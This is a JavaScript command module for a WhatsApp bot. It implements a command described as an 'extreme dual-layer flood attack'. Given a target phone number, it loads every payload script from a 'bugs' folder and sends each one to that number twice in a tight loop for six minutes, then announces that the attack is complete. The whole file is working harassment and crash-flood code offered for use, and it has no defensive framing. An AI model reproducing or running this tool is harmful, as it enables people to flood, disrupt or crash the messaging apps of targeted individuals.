const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'jesus-x-dawens',
  desc: 'Extreme dual-layer flood attack (DAWENS+JESUS)',
  category: 'bug',
  react: '💣',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'jesus-x-dawens') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}jesus-x-dawens <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.'
      }, { quoted: mek });
    }

    // ✅ VOYE IMG 4.png AVAN ATAK
    const imagePath = path.join(__dirname, '../media/4.png');
    const imageBuffer = fs.readFileSync(imagePath);
    await bot.sendMessage(from, {
      image: imageBuffer,
      caption: `💥 𝐉𝐄𝐒𝐔𝐒-𝐗-𝐃𝐀𝐖𝐄𝐍𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 💥\n\n🎯 Target: wa.me/${targetNumber}\n⏱ Duration: 6min\n⚡ Delay: 0.0001s\n📦 Payloads: ${bugFiles.length} x2\n\n🚨 *POWERED BY DAWENS BOY 🇭🇹🔥*`,
    }, { quoted: mek });

    const endTime = Date.now() + (6 * 60 * 1000);

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
            await bugPayload(bot, targetNumber); // repeat x2
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 0.1)); // 0.0001s = 0.1ms
      }
    }

    await bot.sendMessage(from, {
      text: `✅ 𝐉𝐄𝐒𝐔𝐒-𝐗-𝐃𝐀𝐖𝐄𝐍𝐒 attack complete on +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
